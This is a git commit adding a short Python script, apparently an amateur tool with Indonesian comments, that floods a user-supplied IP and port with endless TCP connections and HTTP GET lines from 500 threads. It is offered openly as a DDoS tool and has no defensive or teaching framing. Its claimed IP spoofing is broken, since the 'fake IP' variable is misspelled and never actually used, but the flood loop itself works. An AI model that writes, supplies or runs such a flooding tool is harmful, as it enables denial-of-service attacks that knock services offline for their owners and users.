f35194ed17d8d206c7a61070c02ab49179a0cbd3
NumeX <69904588+NumeXx@users.noreply.github.com>
2021-01-09 09:30:20 +0000

    DDoS

---
+++ DDoS.py
@@ -0,0 +1,35 @@
+# Simple Tools
+# Author : NumeX
+
+# Module
+import socket
+import threading
+
+# Skuyy
+print("Simple Tools DDoS\n")
+target = input("[?] Enter IP Target : ")
+port = int(input("[?] Enter The Port : "))
+
+# Kita Pake Fake IP :v
+fale_ip = '182.21.20.32'
+
+# Connectednya
+already_connected = 0
+
+# Fungsi Attacknya
+def attack():
+    while  True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("HOST: = fake_ip" + "\r\n\r\n").encode('ascii'), (target, port))
+
+        global already_connected
+        already_connected += 1
+        if already_connected % 500 == 0:
+            print(already_connected) # oke work ya oke thanks yyyyyy
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
